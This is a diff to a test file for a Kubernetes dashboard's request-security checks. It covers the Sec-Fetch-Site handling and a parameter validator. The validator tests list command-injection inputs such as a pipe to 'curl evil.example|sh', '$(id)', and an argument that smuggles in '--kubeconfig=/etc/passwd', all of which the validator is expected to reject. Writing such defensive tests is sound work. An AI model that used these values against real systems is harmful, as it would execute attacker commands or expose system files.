@@ -1,6 +1,6 @@
 import type { IncomingMessage } from "http";
 import { afterEach, describe, expect, it } from "vitest";
-import { isTrustedRequest } from "./security";
+import { findInvalidParam, isTrustedRequest } from "./security";
 
 const req = (headers: Record<string, string>) => ({ headers }) as unknown as IncomingMessage;
 
@@ -26,5 +26,51 @@ describe("isTrustedRequest", () => {
     expect(isTrustedRequest(r)).toBe(false);
     process.env.KUBEDECK_ALLOWED_HOSTS = "tunnel.example";
     expect(isTrustedRequest(r)).toBe(true);
+  });
+});
+
+describe("Sec-Fetch-Site", () => {
+  it("rejects cross-site requests that carry no Origin (an <img> GET)", () => {
+    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "cross-site" }))).toBe(false);
+    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "same-site" }))).toBe(false);
+  });
+  it("accepts the app's own requests and typed URLs", () => {
+    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "same-origin" }))).toBe(true);
+    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "none" }))).toBe(true);
+  });
+});
+
+describe("findInvalidParam", () => {
+  it("accepts real Kubernetes names", () => {
+    expect(findInvalidParam({
+      context: "arn:aws:eks:us-east-1:123456789012:cluster/prod", namespace: "kube-system",
+      name: "e2-admin-module-dd8c44c74-pgz4r", type: "deployment.apps", container: "app", tail: "200",
+    })).toBeNull();
+    expect(findInvalidParam({ context: "user@cluster", namespace: "all" })).toBeNull();
+    expect(findInvalidParam({ context: "gke_proj_europe-west1_main" })).toBeNull();
+    expect(findInvalidParam({ name: "system:controller:x" })).toBeNull();
+  });
+  it.each([
+    ["context", "a|curl evil.example|sh"],
+    ["context", "x; id"],
+    ["context", "$(id)"],
+    ["context", "a b"],
+    ["context", "--kubeconfig=/etc/passwd"],
+    ["namespace", "a && id"],
+    ["namespace", "-A"],
+    ["namespace", "Prod"],
+    ["name", "x`id`"],
+    ["name", "-o=yaml"],
+    ["type", "pod;id"],
+    ["tail", "10; id"],
+    ["container", "a>b"],
+    ["warningsOnly", "yes"],
+  ])("rejects %s=%j", (key, value) => {
+    expect(findInvalidParam({ [key]: value })).toBe(key);
+  });
+  it("rejects repeated (array) values and ignores absent ones", () => {
+    expect(findInvalidParam({ context: ["a", "b"] })).toBe("context");
+    expect(findInvalidParam({})).toBeNull();
+    expect(findInvalidParam({ context: "" })).toBeNull();
   });
 });
